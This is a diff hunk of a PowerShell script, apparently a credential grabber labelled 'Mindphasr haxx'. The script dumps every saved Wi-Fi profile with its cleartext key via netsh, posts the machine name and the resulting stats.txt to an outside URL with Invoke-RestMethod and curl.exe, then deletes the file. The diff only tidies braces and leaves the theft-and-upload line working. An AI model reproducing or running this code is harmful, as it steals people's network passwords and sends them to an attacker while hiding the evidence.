@@ -21,9 +21,8 @@ Function Get-NetworkInfos{
     foreach ($row in $a){
         $b=(netsh wlan show profile $row key=clear)
         add-content -path ".\stats.txt" -value $b}
-        $Body=@{ content = "$env:computername Stats from Mindphasr haxx"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url}
-        Remove-Item '.\stats.txt'
-    }
+    $Body=@{ content = "$env:computername Stats from Mindphasr haxx"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url
+    Remove-Item '.\stats.txt'
 }
 
 Get-NetworkInfos
